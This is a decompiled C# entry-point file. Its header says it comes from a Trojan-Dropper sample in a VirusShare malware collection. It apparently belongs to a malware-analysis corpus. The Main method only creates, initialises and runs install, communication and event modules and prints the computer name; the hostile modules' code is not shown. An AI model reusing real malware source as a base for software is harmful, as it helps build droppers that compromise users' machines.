﻿// Decompiled with JetBrains decompiler
// Type: Poly.Program
// Assembly: Poly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 618F3010-979B-4F78-8F99-D5C35E30AA2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.Win32.Sysn.bshb-a13f90b28df8b73652beb4c3c95ff1b8dc0c2fc41dee8f7d6acdd43828a0aadc.exe

using System;
using System.Collections.Generic;

namespace Poly
{
  internal class Program
  {
    [MTAThread]
    private static void Main(string[] args)
    {
      List<Base_Settings> baseSettingsList = new List<Base_Settings>();
      baseSettingsList.Add(new Base_Settings());
      baseSettingsList.Add((Base_Settings) new _Install());
      baseSettingsList.Add((Base_Settings) new _communicate());
      baseSettingsList.Add((Base_Settings) new _event());
      foreach (Base_Settings baseSettings in baseSettingsList)
        baseSettings.Initialise();
      baseSettingsList.RemoveAt(3);
      baseSettingsList.RemoveAt(1);
      baseSettingsList.RemoveAt(0);
      foreach (Base_Settings baseSettings in baseSettingsList)
        baseSettings.Run();
      Console.WriteLine("PCname = {0}", (object) Base_Settings.pcName);
      Console.ReadLine();
    }
  }
}